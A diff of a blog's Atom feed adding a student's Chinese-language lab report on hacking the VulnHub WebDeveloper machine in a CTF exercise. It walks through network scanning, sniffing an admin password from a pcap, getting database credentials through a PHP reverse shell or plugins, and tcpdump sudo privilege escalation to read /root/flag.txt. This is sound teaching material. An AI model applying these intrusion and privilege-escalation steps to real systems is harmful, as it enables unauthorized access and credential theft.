@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://1900301430.github.io</id>
     <title>1900301430&apos;s Blog.</title>
-    <updated>2020-12-05T06:46:19.895Z</updated>
+    <updated>2020-12-06T12:07:16.153Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://1900301430.github.io"/>
     <link rel="self" href="https://1900301430.github.io/atom.xml"/>
@@ -10,6 +10,155 @@
     <logo>https://1900301430.github.io/images/avatar.png</logo>
     <icon>https://1900301430.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, 1900301430&apos;s Blog.</rights>
+    <entry>
+        <title type="html"><![CDATA[ 网络渗透测试实验四——CTF实践]]></title>
+        <id>https://1900301430.github.io/post/wang-luo-shen-tou-ce-shi-shi-yan-si-ctf-shi-jian/</id>
+        <link href="https://1900301430.github.io/post/wang-luo-shen-tou-ce-shi-shi-yan-si-ctf-shi-jian/">
+        </link>
+        <updated>2020-12-06T12:06:17.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="网络渗透测试实验四ctf实践">网络渗透测试实验四——CTF实践</h1>
+<h2 id="实验目的">实验目的</h2>
+<p>通过对目标靶机的渗透过程，了解CTF竞赛模式，理解CTF涵盖的知识范围，如MISC、PPC、WEB等，通过实践，加强团队协作能力，掌握初步CTF实战能力及信息收集能力。熟悉网络扫描、探测HTTP web服务、目录枚举、提权、图像信息提取、密码破解等相关工具的使用。</p>
+<h2 id="系统环境">系统环境</h2>
+<p>Kali Linux 2、WebDeveloper 靶机来源：https://www.vulnhub.com/</p>
+<h2 id="实验工具">实验工具</h2>
+<p>不限</p>
+<h1 id="实验步骤和内容">实验步骤和内容</h1>
+<h2 id="目的">目的</h2>
+<p>获取靶机Web Developer 文件/root/flag.txt中flag。</p>
+<h2 id="基本思路">基本思路</h2>
+<p>本网段IP地址存活扫描(netdiscover)；网络扫描(Nmap)；浏览HTTP 服务；网站目录枚举(Dirb)；发现数据包文件 “cap”；分析 “cap” 文件，找到网站管理后台账号密码；插件利用（有漏洞）；利用漏洞获得服务器账号密码；SSH 远程登录服务器；tcpdump另类应用。</p>
+<h2 id="实施细节如下">实施细节如下</h2>
+<h3 id="1发现目标-netdiscover找到webdeveloper的ip地址-截图">1.发现目标 (netdiscover)，找到WebDeveloper的IP地址。截图。</h3>
+<pre><code>netdiscover -r 192.168.177.130
+</code></pre>
+<p>时间可能会比较长，需耐心等待。</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/20201206094112141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<h3 id="2利用nmap扫描目标主机发现目标主机端口开放-服务情况截图并说明目标提供的服务有哪些利用第一次实验知识点">2.利用NMAP扫描目标主机，发现目标主机端口开放、服务情况，截图并说明目标提供的服务有哪些？（利用第一次实验知识点）</h3>
+<pre><code>nmap -sT 192.168.177.130
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/2020120609432196.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>开放了22（ssh）端口和80（http)端口，分别提供远程登录服务和网站服务。</p>
+<h3 id="3若目标主机提供了http服务尝试利用浏览器访问目标网站-截图-是否有可用信息">3.若目标主机提供了HTTP服务，尝试利用浏览器访问目标网站。截图。是否有可用信息？</h3>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/20201206095440442.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/20201206095813129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>其实没看出来有太多信息，但是估计这个网站应该是用WordPress搭建的，且建于2018年10月。<br>
+查询得知WordPress是使用PHP语言开发的博客平台。</p>
+<h3 id="4利用whatweb探测目标网站使用的cms模板-截图-分析使用的cms是什么">4.利用whatweb探测目标网站使用的CMS模板。截图。分析使用的CMS是什么？</h3>
+<pre><code>whatweb 192.168.177.130
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/20201206100330499.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>这里的CMS应该就是WordPress。</p>
+<h3 id="5网络搜索wpscan简要说明其功能">5.网络搜索wpscan，简要说明其功能。</h3>
+<p>WPScan是Kali Linux默认自带的一款漏洞扫描工具，能够扫描WordPress网站中的多种安全漏洞。</p>
+<h3 id="6使用-dirb-爆破网站目录-dirb-是一个专门用于爆破目录的工具在-kali-中默认已经安装类似工具还有国外的patatordirsearchdirbuster-国内的御剑截图-找到一个似乎和网络流量有关的目录路径">6.使用 Dirb 爆破网站目录。（Dirb 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装，类似工具还有国外的patator，dirsearch，DirBuster， 国内的御剑）截图。找到一个似乎和网络流量有关的目录（路径）。</h3>
+<pre><code>dirb http://192.168.177.130/
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201206102658247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
+应该就是这个了吧。</p>
+<h3 id="5浏览器访问该目录路径发现一个cap文件-截图">5.浏览器访问该目录（路径），发现一个cap文件。截图。</h3>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/20201206102832241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<h3 id="6利用wireshark分析该数据包分析tcp数据流-找到什么有用的信息截图">6.利用Wireshark分析该数据包，分析TCP数据流。找到什么有用的信息？截图。</h3>
+<pre><code>http.request.method == POST
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/20201206103611120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"><br>
+得到<br>
+账号：webdeveloper<br>
+密码：Te5eQg&amp;4sBS!Yr$)wf%(DcAd</p>
+<h3 id="7利用上一步得到的信息进入网站后台-截图-网站管理员账号与操作系统账号是不同概念">7.利用上一步得到的信息进入网站后台。截图。（网站管理员账号与操作系统账号是不同概念）</h3>
+<p>打开 http://192.168.177.130/wp-admin/ 输入上一步得到的账号密码登录。</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/20201206104257888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<h3 id="8利用该cms存在的插件plugin漏洞">8.利用该CMS存在的（插件Plugin）漏洞。</h3>
+<h3 id="9利用该插件漏洞提权">9.利用该插件漏洞提权。</h3>
+<blockquote>
+<p>这里我选用方案3。</p>
+</blockquote>
+<p><strong>可选方案1</strong><br>
+利用MeterSploit插件+reflex gallery插件漏洞实现。安装reflex gallery插件。利用该插件可能存在的漏洞。（课本知识点）<br>
+建立会话后，查看wp-config.php获得账号及口令。（配置文件很重要，各种系统的配置文件）。<br>
+获得的账号、口令是用来访问什么目标？注意与第7步描述比较。</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/20201205145802360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/20201205145817897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>可选方案2</strong><br>
+上传反弹shell。<br>
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell<br>
+【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面。<br>
+功能：该脚本会发起反弹TCP连接到攻击者（脚本中指定攻击者IP地址和端口号）。】<br>
+该CMS为PHP开发，可以利用其实现反弹shell。但必须修改初始化IP地址和端口。（指向攻击者）。</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/20201205145949254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>进入后台，找到任意一个PHP页面，然后利用php-reverse-shell.PHP的代码修改该页面的代码。</p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/20201205150031948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>修改代码中反弹目标的IP地址及端口（修改为攻击者IP地址及开放的端口号）。</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/2020120515005947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>攻击者在Kali中利用NC开始监听，攻击者浏览器访问修改的PHP页面。从而得到反弹shell（用户www-data）。建立会话后，查看wp-config.php获得账号及口令。（注意路径）</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/20201205150152706.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/20201205150159133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>方案3</strong><br>
+利用文件管理插件（File manager）漏洞。<br>
+安装该插件，直接可以浏览wp-config.php。</p>
+<p>打开到其Plugins页面<br>
+点击AddNew<br>
+<img src="https://img-blog.csdnimg.cn/20201206110138393.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></p>
+<p>搜索框输入file manager，找到并点击InstallNow安装。</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/20201206112143592.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>安装完成后，InstallNow会变为Active，点击即可激活。<br>
+打开到WP File Manager并找到wp-config.php。</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/20201206112931501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>打开wp-config.php，得到账号密码。</p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/2020120611343646.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>以上方案三选一，或找到可以实现的方案，操作步骤截图。</p>
+<h3 id="10ssh登录服务器">10.SSH登录服务器</h3>
+<p>尝试利用上一步获得的访问数据库的用户名和密码连接远程服务器。截图。</p>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/20201206133751636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L01KXzE5MDAzMDE0MzA=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述" loading="lazy"></figure>
+<h4 id="1尝试查看rootflagtxt">1.尝试查看/root/flag.txt</h4>
+<figure data-type="image" tabindex="19"><img src="https://img-blog.csdnimg.cn/20201206134240601.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<pre><code>cat /root/flag.txt
+</code></pre>
+<pre><code>whoami
+</code></pre>
+<pre><code>ls -l /root/flag.txt
+</code></pre>
+<p>均无法查看。</p>
+<h4 id="2使用tcpdump执行任意命令当tcpdump捕获到数据包后会执行指定的命令">2.使用tcpdump执行任意命令（当tcpdump捕获到数据包后会执行指定的命令。）</h4>
+<p>查看当前身份可执行的命令。</p>
+<pre><code>sudo -l
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://img-blog.csdnimg.cn/20201206134555948.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>发现可以root权限执行tcpdump命令<br>
+创建攻击文件</p>
+<pre><code>touch /tmp/exploit1
+</code></pre>
+<p>写入shellcode</p>
+<pre><code>echo 'cat /root/flag.txt' &gt; /tmp/exploit
+</code></pre>
+<p>赋予可执行权限</p>
+<pre><code>chmod +x /tmp/exploit
+</code></pre>
+<p>利用tcpdump执行任意命令</p>
+<pre><code>sudo tcpdump -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
+</code></pre>
+<p>获得flag</p>
+<figure data-type="image" tabindex="21"><img src="https://img-blog.csdnimg.cn/20201206135012899.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>tcpdump命令详解：<br>
+-i eth0 从指定网卡捕获数据包<br>
+-w /dev/null 将捕获到的数据包输出到空设备（不输出数据包结果）<br>
+-z [command] 运行指定的命令<br>
+-Z [user] 指定用户执行命令<br>
+-G [rotate_seconds] 每rotate_seconds秒一次的频率执行-w指定的转储<br>
+-W [num] 指定抓包数量</p>
+<h1 id="实验总结">实验总结</h1>
+<p>这里是实验小结。<br>
+本次实验应用到了前几次实验的绝大部分内容，包括：</p>
+<ol>
+<li>Nmap使用</li>
+<li>端口及服务</li>
+<li>WireShark</li>
+<li>利用漏洞<br>
+其实实验难度不是很高，毕竟都有指导了。<br>
+到此所有四个实验都结束了，但是一切都还未结束，继续努力吧。</li>
+</ol>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[网络渗透测试实验三——XSS和SQL注入]]></title>
         <id>https://1900301430.github.io/post/wang-luo-shen-tou-ce-shi-shi-yan-san-xss-he-sql-zhu-ru/</id>
